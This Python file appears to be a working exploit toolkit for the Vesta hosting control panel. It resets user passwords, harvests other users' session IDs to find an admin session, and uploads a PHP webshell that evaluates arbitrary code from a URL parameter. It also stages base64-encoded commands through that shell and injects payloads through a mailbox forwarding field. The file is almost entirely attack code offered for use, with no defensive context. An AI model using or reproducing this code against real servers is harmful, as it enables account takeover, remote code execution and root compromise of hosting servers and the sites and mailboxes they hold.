import requests
import re
import json
import socket
from urllib.parse import urlparse
import random
import string
import base64

from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def resetPassword(username,targetHost,rkey):
	newPassword = get_random_string()
	r = requests.post(targetHost + '/api/v1/reset/index.php', verify=False, data={'password':newPassword,'password_confirm':newPassword, 'user':username,'code':rkey})
	if '"error":null,' in r.text:
		return newPassword
	else:
		return False

def checkSessions(us,targetHost,ipFromHostname,sessions,pwnDomain):
	for i in sessions:
		qTry = queryWebshell('echo `curl -k "https://127.0.0.1:'+str(urlparse(targetHost).port)+'/api/v1/login/session.php" -H "Cookie: PHPSESSID='+i+';" `;',ipFromHostname,pwnDomain)
		if '"root_dir":"\\/home\\/admin"' in qTry:
			print('[++] Admin session found ')
			return i,qTry
	print('[!] no admin session found')
	return False


def getSessIDs(us,targetHost,SessID):
	r = us.get(targetHost + '/api/v1/upload/index.php?dir=/usr/local/vesta/data/sessions', verify=False)
	try:
		if '{"files":' in r.text:
			myList = []
			for i in r.json()['files']:
				if SessID not in i['name']:
					myList.append(i['name'].replace('sess_',''))
			return myList
		else:
			print('Getting Sessions list Error')
			return False
	except Exception as e:
		print(str(e))
		return False


def getIPfromHostname(hostn):
	return socket.gethostbyname(urlparse(hostn).hostname)

def get_random_string(length=10):
    letters = string.ascii_letters+string.digits
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str

def getSession(us,targetHost,ss=1):
	sessPath ='/api/v1/login/index.php'
	if ss == 2:
		sessPath = '/api/v1/login/session.php'
	r = us.get(targetHost + sessPath, verify=False)
	try:
		if '"token":"' in r.text:
			return r.json()
		else:
			print('Getting own session data error')			
			exit()
	except Exception as e:
		print(str(e))
		exit()

def login(us,targetHost,login,passwd):
	try:
		r = us.post(targetHost + '/api/v1/login/index.php', verify=False, data={'user':login,'password':passwd,'token':getSession(us,targetHost)['token']})
		if r.text and '"error":"Invalid username or password."' not in r.text:
			print('[+] Logged in as '+login)
			return True
		else:
			print("[!] login failed")
			exit()
			return False
	except Exception as e:
		print(str(e))
		return False
	

def logout(us,targetHost):
	r = us.get(targetHost + '/api/v1/logout/index.php', verify=False)
	print('[+] Logged out ')

def getWebshell(us,targetHost,shellHost,username,ipFromHostname):
	#r = us.get(targetHost + '/api/v1/delete/web/index.php?domain='+shellHost+'&token='+getSession(us,targetHost,2)['token'],verify=False)
	r = us.get(targetHost + '/api/v1/list/web/index.php', verify=False)
	if shellHost not in r.text:
		print('[!] '+shellHost+' not found, creating one...')
		r = us.get(targetHost + '/api/v1/add/web/index.php', verify=False)
		try:
			webConf = r.json()
			## Checking if IPs match			
			if ipFromHostname not in r.text:
				print('[!] IP mismatch, select an appropriate IP for the '+shellHost)
				confIPsList = []
				count = 0
				for i in webConf['ips']:
					confIPsList.append(i)
					print('\t['+str(count)+'] '+i)
					count+=1
				selectedIP = confIPsList[int(input('\t> '))]
			else:
				selectedIP = ipFromHostname
			
			r2 = us.post(targetHost + '/api/v1/add/web/index.php' , verify=False, data={"ok": "add", "token": getSession(us,targetHost,2)['token'], "v_domain": shellHost, "v_ip": selectedIP, "v_aliases": "www."+shellHost, "v_dns": "on", "v_mail": "on", "v_proxy": "on", "v_proxy_ext": webConf['proxy_ext']})
			if 'has been created successfully' in r2.text:
				print('[+] '+shellHost+' added')
		except Exception as e:
			print(str(e))
			return False
		
	
	print('[+] '+shellHost+' found, looking up webshell')
	checkWS = queryWebshell('echo HelloVestaPWN3647387238263784;',ipFromHostname,shellHost)
	if('HelloVestaPWN3647387238263784' not in checkWS):
		print('[!] webshell not found, creating one..')
		r = us.post(targetHost+'/api/v1/upload/?dir=/home/'+username+'/web/'+shellHost+'/public_html',verify=False,files = {'files': ('ownwebshell.php', '<?php\nif(@$_GET["password"]!="e43c9f07ed59712efa492aa0ae259cd0") exit();\neval($_GET["e"]);')} )
		if('"name":"ownwebshell.php"' in r.text):
			print('[+] Webshell uploaded')
			return True
		else:
			print('[!] webshell upload error')
			return False
	else:
		print('[+] '+username+' webshell found')
		return True
		

def createMailBox(us,targetHost,shellHost,isDebug):
	mailAccount  = get_random_string().lower()
	mailPassword = get_random_string()
	r = us.get(targetHost + '/api/v1/delete/mail/index.php?domain='+shellHost+'&token='+getSession(us,targetHost,2)['token'],verify=False)
	r = us.get(targetHost + '/api/v1/list/mail/index.php', verify=False)
	if shellHost in r.text:
		if isDebug: print('[+] Mail domain found')
	else:
		if isDebug: print('[!] Mail domain not found, creating one..')
		r2 = us.post(targetHost + '/api/v1/add/mail/index.php', verify=False, data={"ok": "add", "token": getSession(us,targetHost,2)['token'], "v_domain": shellHost, "v_antispam": "on", "v_antivirus": "on", "v_dkim": "on"})
		if '"error_msg":null' in r2.text:
			if isDebug: print('[+] Mail domain created')
		else:
			print('[!] mail domain creating error')
			return False

	r = us.post(targetHost + '/api/v1/add/mail/index.php?domain='+shellHost,verify=False, data={"v_domain": shellHost, "v_account": mailAccount, "v_password": mailPassword, "Username": "@"+shellHost, "v_credentials": '', "ok_acc": "add", "token": getSession(us,targetHost,2)['token'], "Password": mailPassword})
	if '"error_msg":null' in r.text:
		if isDebug: print('[+] Mail account created')
		return {'account':mailAccount,'password':mailPassword}
	else:
		print('[!] creating new mail failed ..')
		return False


def editMailBox(us,targetHost,shellHost,Vaccount,payload,isDebug=True):
	r = us.post(targetHost + '/api/v1/edit/mail/index.php?domain='+shellHost+'&account='+Vaccount,verify=False, data={"save": "save", "token": getSession(us,targetHost,2)['token'], "v_domain": shellHost, "v_password": '', "v_quota": "unlimited", "v_aliases": '', "v_fwd": payload, "v_credentials": '', "Username": "@"+shellHost, "v_account": Vaccount, "Password": ''})
	if '"ok_msg":"Changes have been saved."' in r.text:
		return True
	else:
		if isDebug: print('[!] mailbox edit failed ..')
		return False

def b64en(strr):
	return base64.b64encode(strr.encode('utf-8')).decode('utf-8')

def deploycommand(cmd,ipFromHostname,pwnDomain):
	queryWebshell('echo `pwd;mkdir -p ./iamroot;`;',ipFromHostname,pwnDomain)
	queryWebshell('`printf '+b64en(cmd)+'|base64 -d > ./iamroot/cmdtoexec`;',ipFromHostname,pwnDomain)

def queryWebshell(cmd,ipFromHostname,shellHost='vestapwn.poc'):
	r = requests.get('http://'+ipFromHostname+'/ownwebshell.php?password=e43c9f07ed59712efa492aa0ae259cd0&e='+cmd,headers={'Host':shellHost},verify=False)
	return r.text

